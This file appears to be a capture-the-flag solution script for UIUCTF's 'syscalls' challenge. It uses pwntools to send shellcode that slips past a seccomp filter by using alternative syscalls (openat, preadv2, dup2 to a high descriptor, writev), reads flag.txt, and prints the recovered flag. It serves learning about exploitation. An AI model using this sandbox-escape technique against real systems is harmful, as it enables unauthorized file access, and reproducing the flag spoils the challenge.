#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./syscalls", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b *0x5555555552d6")
p = remote("syscalls.chal.uiuc.tf", 1337, ssl=True)

p.readline()

# 0022: 0x25 0x00 0x01 0x000003e8  if (A <= 0x3e8) goto 0024
FIRST_ACCEPTABLE_FD = 0x3e9

p.sendline(asm(
# make some space
# we'll use r12 as an iovec* and r13 as iovec->iov_base
"""
mov r12, rsp
mov r13, r12
sub r13, 4096
"""

# setup the iovec structure r12 = &v
# note: see man 3 iovec
# #include <sys/uio.h>
# struct iovec {
#     void* iov_base;
#     size_t iov_len;
# }
"""
mov qword ptr[r12], r13
mov qword ptr[r12+8], 4096
"""

# ensure that flag.txt will be followed by one or more \x00 bytes
# by zeroing a portion of the stack
"""
xor eax, eax
push rax
push rax
pop rax
"""

# rsi = "flag.txt\x00"
# note: that flag.txt is exactly 8 bytes
# so we need a \x00 byte in the next slot of the stack
"""
mov rax, 0x7478742e67616c66
push rax
mov rsi, rsp
"""

# int fd = openat(AT_FDCWD, "flag.txt", 0, 0)
# note: that AT_FDCWD is represented by the value -100
"""
mov r10, 0
mov rdx, 0
mov rdi, -100
mov eax, SYS_openat
syscall
"""

# int read = preadv2(fd, &iovec, 1, 0, 0)
"""
mov r8, 0
mov r10, 0
mov rdx, 1
mov rsi, r12
mov rdi, rax
mov eax, SYS_preadv2
syscall
"""

# update the iovec.iov_len with num bytes read
"""
mov qword ptr[r12+8], rax
"""

# dup2 stdout to satisfy <= 0x3e8 fd seccomp constraint
f"""
mov rsi, {FIRST_ACCEPTABLE_FD}
mov rdi, 1
mov eax, SYS_dup2
syscall
"""

# write the flag, from the iovec, to stdout
# via fd=FIRST_ACCEPTABLE_FD/0x3e9 using writev
f"""
mov rdx, 1
mov rsi, r12
mov rdi, {FIRST_ACCEPTABLE_FD}
mov eax, SYS_writev
syscall
"""
))

# uiuctf{a532aaf9aaed1fa5906de364a1162e0833c57a0246ab9ffc}
print(p.recvall().decode())
